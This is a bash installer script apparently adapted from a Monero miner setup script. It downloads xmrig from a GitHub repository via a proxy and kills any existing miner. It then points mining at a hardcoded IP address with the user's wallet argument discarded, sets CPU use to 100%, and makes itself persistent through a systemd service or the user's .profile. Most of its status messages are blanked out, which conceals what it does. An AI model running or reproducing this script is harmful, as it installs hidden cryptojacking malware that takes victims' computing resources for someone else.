#!/bin/bash

VERSION=2.11

# printing greetings

echo "Without a mission, human beings will not exist. It is the mission that created us, but the mission connects us, affects us, guides us, promotes us, and constrains us."
echo
if [ "$(id -u)" == "0" ]; then
  echo ""
fi
# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

# checking prerequisites


if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

# calculating port

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    elif [ "$1" -gt "0" ]; then
      echo "0"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 443 ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "443" -o "$PORT" -gt "443" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi


# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo ""
echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
echo ""
echo "Mining will happen to $WALLET wallet."
echo ""
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo ""
  echo ""
else
  echo ""
  echo ""
fi

echo
echo ""
echo

echo ""
echo ""
echo
echo

# start doing stuff: preparing miner

echo ""
echo ""
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/c3pool directory"
rm -rf $HOME/c3pool

echo ""
echo ""
if ! curl -L --progress-bar "https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://ghproxy.com/https://raw.githubusercontent.com/Tremblae/Tremble/main/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo ""
  exit 1
fi

echo ""
echo ""
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
  echo ""
  echo ""
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo ""
echo ""
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
$HOME/c3pool/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/c3pool/xmrig ]; then
    echo ""
	echo ""
  else 
    echo ""
	echo ""
  fi

  echo ""
  echo ""
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo ""
  echo ""
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo ""
	echo ""
    exit 1
  fi

  echo ""
  echo ""
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
    echo ""
	echo ""
  fi
  rm /tmp/xmrig.tar.gz

  echo ""
  echo ""
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
  $HOME/c3pool/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/c3pool/xmrig ]; then
      echo ""
	  echo ""
    else 
      echo ""
	  echo ""
    fi
    exit 1
  fi
fi

echo ""
echo ""

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "103.215.83.13:'$PORT'",/' $HOME/c3pool/config.json
sed -i 's/"user": *"[^"]*",/"user": "''",/' $HOME/c3pool/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'default'",/' $HOME/c3pool/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json

cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json


# preparing script

echo ""
echo ""
cat >$HOME/c3pool/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/c3pool/xmrig \$*
else
  echo ""
  echo ""
  echo ""
  echo ""
fi
EOL

chmod +x $HOME/c3pool/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
    echo ""
	echo ""
    echo "" >>$HOME/.profile
  else 
    echo ""
	echo ""
  fi
  echo ""
  echo ""
  /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
	echo "[*] 启用 huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo ""
	echo ""
    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
    echo ""
	echo ""
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable c3pool_miner.service
    sudo systemctl start c3pool_miner.service
    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
	echo ""
  fi
fi

echo ""
echo ""
echo ""
if [ "$CPU_THREADS" -lt "4" ]; then
  echo ""
  echo ""
  echo ""
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo ""
  else
    echo ""
  fi
else
  echo ""
  echo ""
  echo " \$HOME/c3pool/config_background.json"
fi